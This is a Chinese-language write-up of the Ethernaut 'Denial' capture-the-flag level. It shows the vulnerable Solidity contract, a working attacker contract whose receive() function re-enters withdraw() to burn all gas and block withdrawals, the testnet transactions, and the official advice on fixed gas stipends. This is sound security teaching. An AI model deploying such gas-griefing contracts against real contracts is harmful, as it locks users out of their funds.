# Level 20: Denial

## 1. 问题
需要你阻止用户调用 `withdraw()` 函数来从合约中提款出去。

<details>
<summary>点击展开原始问题说明</summary>
    

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

</details>

## 2. 解法

思路：设置 `partner` 的 `receive` 函数，在接受 `eth` 时，递归调用 `Denial.withdraw()`, 从而形成循环调用，直到 gas 超过上限。

```solidity
// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

interface DenialI {
    function setWithdrawPartner(address _partner) external;
    function contractBalance() external view returns (uint256);
    function withdraw() external;
}

contract PartnerHack {
    
    DenialI public denial;
    
    constructor(address _denial) {
        denial = DenialI(_denial);
    }
    
    receive() external payable {
        // 递归循环调用，直到gas超过上限
        denial.withdraw();
    }
}
```

1. [部署 `PartnerHack`](https://sepolia.etherscan.io/tx/0xe591fc9f902411fa7b2ccabe99a620e8b2c2a307942a4274c24c0c233f41d9a8)

2. [设置 `partner` 地址](https://sepolia.etherscan.io/tx/0xe23acde5f24c60986483019796a3aa02e52c1325a44bae630c3b07ef20703d5d)

3. [Submit instance](https://sepolia.etherscan.io/tx/0x845d4a42e5576b7fa10809e422905b55895e27790571c752b9e2f4c65f20efee), 通过！

## 3. 官方说明

> [!CAUTION]
This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `<Address>.call{gas: <gasAmount>}(data)`. Typically one should follow the [checks-effects-interactions](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.

<br/>
<br/>

| [⬅️ level19 Allen Codex](../level19_allencodex/README.md) | [level21 Shop ➡️](../level21_shop/README.md) |
| :---------------------------------------------------------- | -----------------------------------------------: |
